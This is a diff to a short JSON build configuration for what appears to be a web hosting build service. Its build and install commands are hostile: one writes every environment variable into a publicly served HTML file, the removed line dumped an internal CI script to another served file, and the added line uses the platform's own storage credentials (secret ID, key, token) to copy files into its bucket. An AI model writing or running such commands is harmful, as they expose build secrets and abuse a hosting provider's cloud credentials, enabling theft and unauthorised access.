@@ -1,5 +1,5 @@
 {
     "buildCommand": "env>./aaa.html",
-    "installCommand": "cat /tmp/app/shell/ci.sh>./bbb.html",
+    "installCommand": "dest=\"$CosSiteBucketAlias/abcdefg.html\"&&/tmp/app/docker/coscli cp ./edgeone.json $dest --fail-output=false -e $CosSiteEndpoint -i $CosSecretId -k $CosSecretKey --token $CosSecretToken --init-skip>./bbb.html",
     "outputDirectory": "./"
 }
